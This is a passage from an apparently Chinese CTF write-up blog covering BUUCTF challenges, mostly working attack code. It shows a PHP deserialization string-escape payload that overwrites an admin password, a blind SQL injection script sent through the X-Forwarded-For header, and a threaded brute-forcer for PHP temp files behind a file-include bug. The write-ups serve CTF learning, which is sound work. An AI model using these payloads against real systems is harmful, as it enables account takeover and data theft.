class="string">&quot;admin&quot;</span>;&#125;&#125;&#125;&#125;</span><br><span class="line">长度<span class="number">456</span></span><br></pre></td></tr></table></figure><p>union变hacker变长了1！</p><p>把pop链带入入口：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$info2 = <span class="keyword">new</span> Info();</span><br><span class="line">$info2-&gt;nickname=serialize($updatehelper);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($info2);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">456</span>:<span class="string">&quot;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:7:&quot;</span>newinfo<span class="string">&quot;;N;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:76:&quot;</span>update user set password=<span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span> where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>nickname<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>手动变成：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">456</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">12</span>:<span class="string">&quot;UpdateHelper&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">7</span>:<span class="string">&quot;newinfo&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">76</span>:<span class="string">&quot;update user set password=&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27; where username=?&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;dbCtrl&quot;</span>:<span class="number">8</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;hostname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;127.0.0.1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbuser&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbpass&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;database&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;mysqli&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们要逃逸的字符是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:7:&quot;</span>newinfo<span class="string">&quot;;N;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:76:&quot;</span>update user set password=<span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span> where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>nickname<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">长度474</span></span><br></pre></td></tr></table></figure><p>用474个union 把paylaod逃逸出来</p><p>最后pyload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:7:&quot;</span>newinfo<span class="string">&quot;;N;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:76:&quot;</span>update user set password=<span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span> where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>nickname<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>测试一下：</p><p>测试的时候c81e728d9d4c2f636f067f89cc14862c两边的单引号 改成双引号！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210803183359.png" alt="image-20210803183352539"></p><p>测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="string">&#x27;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;s:2844:&quot;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:76:&quot;update user set password=&quot;c81e728d9d4c2f636f067f89cc14862c&quot; where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(safe($a)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210803183821.png" alt="image-20210803183821369"></p><p>okok 秒掉秒掉！ 太难了 难死孩子了.😖😖😖😖😖</p><p>最后payload一定注意 <code>&quot;c81e728d9d4c2f636f067f89cc14862c&quot;</code>双引号包裹着不然会出问题！</p><p>我感觉可能就和我们测试的时候一样！不是双引号就字符串报错了！改成双引号就行了！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210803184504.png" alt="image-20210803184504559"></p><p>传入</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">age=<span class="number">1</span>&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:7:&quot;</span>newinfo<span class="string">&quot;;N;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:76:&quot;</span>update user set password=<span class="string">&quot;c81e728d9d4c2f636f067f89cc14862c&quot;</span> where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>nickname<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>调试一下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210803185204.png" alt="image-20210803185204802"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210803185244.png" alt="image-20210803185244044"></p><p>不是题目环境所以报错了！哈哈！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210803185755.png" alt="image-20210803185755512"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210803190401.png" alt="image-20210803190401845"></p><p>okok！ 太难了！ 不过学到了很多东西把！一些以前不在意的细节 搞的我头疼！😫😫😫😫</p><p><code>https://www.jianshu.com/p/08aabdbc8a7b</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node3.buuoj.cn:25869/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.format(i,mid)</span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125; </span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">&#x27;too fast&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid </span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(str(mid),res)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span></span><br><span class="line"><span class="comment">#F4l9_t4b1e</span></span><br><span class="line"><span class="comment">#F4l9_C01uMn</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BUU WEB [GYCTF2020]Easyphp</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUWEBPWN</title>
    <link href="http://upload.love/2021/08/02/BUUWEBPWN/"/>
    <id>http://upload.love/2021/08/02/BUUWEBPWN/</id>
    <published>2021-08-02T03:14:38.000Z</published>
    <updated>2021-08-04T04:01:25.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><h2 id="知识点：文件包含的一些getshell姿势"><a href="#知识点：文件包含的一些getshell姿势" class="headerlink" title="知识点：文件包含的一些getshell姿势"></a><code>知识点：文件包含的一些getshell姿势</code></h2><p><code>https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/</code></p><p><code>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?tdsourcetag=s_pcqq_aiomsg</code></p><p>上传成功后，我们就可以进行文件名的爆破，tmp file的文件名是有规律的，都叫<code>/tmp/php</code>再加上6位的大小写字母加上数字的随机组合，这个爆破量比较大，但是是可行的，贴个exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string,requests,threading,Queue</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters </span><br><span class="line">host = <span class="string">&quot;123.207.99.17&quot;</span> </span><br><span class="line">port = <span class="number">80</span> </span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ready</span>():</span></span><br><span class="line"></span><br><span class="line">queue=Queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> charset: </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> charset: </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> charset: </span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> charset: </span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> charset: </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> charset: </span><br><span class="line">filename = i + j + k + l + m + n</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;putting  &#x27;</span>+filename</span><br><span class="line">queue.put(filename) </span><br><span class="line"></span><br><span class="line">workers=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">worker=threading.Thread(target=get,args=(queue,))</span><br><span class="line">worker.start()</span><br><span class="line">workers.append(worker)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> worker <span class="keyword">in</span> workers:</span><br><span class="line">worker.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">queue</span>):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> queue.qsize()!=<span class="number">0</span>:</span><br><span class="line">filename=queue.get(block=<span class="literal">False</span>)</span><br><span class="line">brute_force_tmp_files(filename)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_tmp_files</span>(<span class="params">filename</span>):</span> </span><br><span class="line">url = <span class="string">&quot;%s/include.php?file=/tmp/php%s&quot;</span> % ( base_url, filename) </span><br><span class="line"><span class="keyword">print</span> url </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">response = requests.get(url,timeout=<span class="number">2</span>) </span><br><span class="line"><span class="keyword">if</span> len(response.content)!=<span class="number">0</span>: </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] Include success!&quot;</span> </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;success.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(filename+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line"><span class="keyword">print</span> e </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span> </span><br><span class="line">get_ready() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="php7-segment-fault"><a href="#php7-segment-fault" class="headerlink" title="php7 segment fault"></a><code>php7 segment fault</code></h3><p><code>预期解的话就是扫目录，可以发现dir.php。这个列出了/tmp下面的所有文件。</code><br><code>可以用php7 segment 